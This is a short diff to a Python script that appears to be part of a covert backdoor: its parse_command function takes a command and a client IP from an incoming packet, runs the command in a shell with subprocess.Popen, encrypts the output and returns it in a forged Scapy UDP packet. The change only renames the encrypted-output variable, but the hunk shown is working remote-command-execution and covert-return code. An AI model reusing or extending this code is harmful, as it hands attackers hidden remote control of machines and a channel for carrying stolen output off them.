@@ -19,11 +19,11 @@ def parse_command(packet):
     client_ip = payload.split('#')[1]
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     output = proc.stdout.read() + "\n" + proc.stderr.read()
-    output = encrypt(output)
+    cipher_output = encrypt(output)
     #print (output)
     # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
     sleep(1) #try giving the client time to recevie.
-    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(sport=int(args.server_port), dport=int(args.client_port))/output
+    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(sport=int(args.server_port), dport=int(args.client_port))/cipher_output
     send(pkt)
 
 
